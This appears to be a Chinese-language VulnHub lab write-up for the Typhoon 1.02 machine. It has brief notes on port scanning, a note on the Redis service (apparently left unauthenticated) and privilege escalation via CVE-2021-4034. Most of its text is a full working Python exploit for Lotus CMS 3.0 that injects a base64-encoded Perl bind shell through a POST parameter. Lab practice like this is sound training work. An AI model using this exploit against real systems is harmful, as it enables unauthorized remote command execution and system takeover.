+++
title = '0x019 Typhoon 1.02'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



# 端口扫描

![](/vulnhub_img/WEBRESOURCEacdbbff87e00e3b1e7c2b593bc9fdd39截图.png)

这次扫描结果太多了，就不看服务扫描结果了，打眼一看全是高危端口

# 渗透

21端口：

![](/vulnhub_img/WEBRESOURCE1fd2eed0df441ab4c9b5033195fe119c截图.png)

80端口 lotuscms成功getshell，应该还有其他洞，感觉洞很多的样子：

```
# -*- coding: utf-8 -*-
#!/usr/bin/python

import socket
import sys
import time
import os
import base64
import urllib

if len(sys.argv) <= 2:
        print "\n      EXPLOIT - BIND SHELL\n"
        print "   - Remote Command Execution -"
        print "     tested on: Lotus CMS 3.0\n"
        print " Usage:"
        print " ./"+sys.argv[0]+" [TARGET IP] [TCP PORT TO OPEN]"
        print " Example:"
        print " ./"+sys.argv[0]+" 192.168.10.106 4444"
else:
        print "\n      EXPLOIT - BIND SHELL\n"
        print "   - Remote Command Execution -"
        print "     tested on: Lotus CMS 3.0\n"
        print " [*] Generating payload..."

        # Monta o payload
        payload0="perl -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,"+sys.argv[2]+",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"
        # Encoda em base64
        payload1 = base64.b64encode(payload0)
        # Junta tudo
        payload2="index');system(base64_decode('"+payload1+"'));#"
        # Encoda URL
        data="page="+urllib.quote(payload2)
        # Calcula o tamanho do payload
        tam = len(data)

        # Monta header + body do request
        request="POST /cms/index.php HTTP/1.1\r\n"
        request+="Host: "+sys.argv[1]+"\r\n"
        request+="User-Agent: Mozilla/5.0\r\n"
        request+="Content-Type: application/x-www-form-urlencoded\r\n"
        request+="Content-Length: "+str(tam)+"\r\n"
        request+="Connection: close\r\n"
        request+="\r\n"
        request+=str(data)

        # Envia o request
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((sys.argv[1],80))
        s.send(request)

        # Exibe o que enviou
        print "\n [*] "+str(len(request))+" bytes sent..."
        print " [*] Getting bind connection...\n"

        # Conecta
        time.sleep(2)
        os.system("nc -vn "+sys.argv[1]+" "+sys.argv[2])

```

![](/vulnhub_img/WEBRESOURCEf0363f514b3370f3c733d384c145ed7d截图.png)

# 提权

![](/vulnhub_img/WEBRESOURCE4295a666d82f90384110925b6e478f06截图.png)

redis未授权应该是有的

![](/vulnhub_img/WEBRESOURCE1d35b284a99f37d5943f82a16dda9360截图.png)

有GCC直接内核提权

CVE-2021-4034

![](/vulnhub_img/WEBRESOURCEff87f9ee0325bd0df0f9d036761e4283截图.png)